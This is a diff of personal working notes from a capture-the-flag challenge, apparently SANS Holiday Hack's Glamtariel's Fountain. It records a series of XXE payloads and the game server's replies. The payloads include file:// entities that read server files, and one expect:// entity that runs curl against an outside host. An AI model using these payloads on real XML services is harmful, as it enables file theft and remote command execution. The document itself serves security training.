@@ -145,13 +145,150 @@ s
 <who>princess</who>
 <reqType>xml</reqType>
 
+
+<?xml version="1.0">
+<!DOCTYPE foo [<!ENTITY toreplace "img1"> ]>
+<root>
+    <imgDrop>&toreplace;</imgDrop>
+    <who>princess</who>
+    <reqType>xml</reqType>
+    </root>
+
+milsarils
+
 "imgDrop":"img1","who":"fountain","reqType":"json"
 
-bottom left to glam and fountain switch options
-talkin about TYPE
+https://glamtarielsfountain.com/static/images/grinchum-supersecret_9364274.png
+https://glamtarielsfountain.com/static/images/stage2ring-eyecu_2022.png
 
 
-grey ring needs to be dropped somewhere specifically probably
+1-sweetstuff-2022.png
+1-kringleman-2022.png
+1-kringlehelper-2022.png
+1-icycube-2022.png
 
-RINGLIST file
-glam keeps a list of all rings in a ringlist.
+
+<?xml version=1.0>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://blakebourgeois.com"> ]>
+<root>
+<imgDrop>img4-65999.png</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+<foo>
+&xxe;</foo>
+</root>
+
+<?xml version=1.0>
+<!DOCTYPE updateProfile [
+ <!ENTITY % moresyntax "<!ENTITY foo 'img1'>">
+%moresyntax;
+]]>
+<root>
+<imgDrop>&foo;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+this works.
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY imagename "redring">
+]>
+<root>
+<imgDrop>&imagename;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+<?xml version="1.0">
+<!DOCTYPE root [
+    <!ENTITY myImage SYSTEM "expect://curl$IFS'blakebourgeois.com/wow.txt'">
+]>
+<root>
+<imgDrop>START_&myImage;_END</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+confired with community and understood i was pursing the wrong path
+the keylist cannot be retrieved/confirmed
+the XXE is not a real XXE that we could see/confirm, but has to be used to provide file to princess
+uses app to the path to the root of the filesystem
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
+<root>
+ <imgDrop>&xxe;</imgDrop>
+ <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+
+
+"appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
+  "droppedOn": "none",
+  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
+
+
+  <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>
+<root>
+ <imgDrop>&xxe;</imgDrop>
+ <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
+<root>
+ <imgDrop>&xxe;</imgDrop>
+ <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+
+{
+  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
+}
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+<root>
+ <imgDrop>&xxe;</imgDrop>
+ <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+
+{
+  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE imgDrop [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+ <body>
+ <object id="imgDrop"
+   type="text/plain"
+   data="&xxe;"</object>
+ <who>princess</who>
+  <reqType>xml</reqType></body>
+  </html>
+
+
+  <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE reqType [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+<root>
+ <imgDrop>img1</imgDrop>
+ <who>princess</who>
+  <reqType>&xxe;</reqType>
+</root>
+
+
+{
+  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
+}
